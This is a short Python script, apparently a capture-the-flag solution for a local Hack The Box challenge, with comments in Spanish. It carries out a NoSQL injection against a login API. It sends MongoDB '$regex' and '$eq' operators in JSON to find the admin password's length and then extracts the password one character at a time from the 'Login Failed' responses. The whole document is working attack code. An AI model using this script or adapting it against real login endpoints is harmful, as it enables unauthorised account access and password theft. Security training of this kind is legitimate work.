import requests
import json
import string

# URL del endpoint vulnerable
url = 'http://127.0.0.1:1337/api/login'

# Datos del formulario de inicio de sesión
#payload = {"username": "admin", "password": "HTB{f4k3_fl4g_f0r_t3st1ng}" }

headers = {
    'Content-Type': 'application/json'
}

# Obtener longitud de la contraseña {"$regex": .{x} }
longitud = 0
while True:

    payload = json.dumps({
        "username": {"$eq": "admin"},
        "password": {"$regex": ".{"+str(longitud)+"}"}
    })

    response = requests.post(url, data=payload, headers=headers)

    if "Login Failed" in response.text:
        longitud = longitud - 1
        break
    else:
        longitud = longitud + 1


# Obtener contraseña con expresión regular
contraseña = ""
diccionario = string.ascii_letters + string.digits + "!#%:;<>@_=}{"

while len(contraseña) < longitud:
    for letra in diccionario:
        
        payload = json.dumps({
            "username": {"$eq": "admin"},
            "password": {"$regex": "^"+contraseña+letra}
        })

        response = requests.post(url, data=payload, headers=headers)

        print(payload)

        if "Login Failed" not in response.text:
            contraseña = contraseña + letra
            break
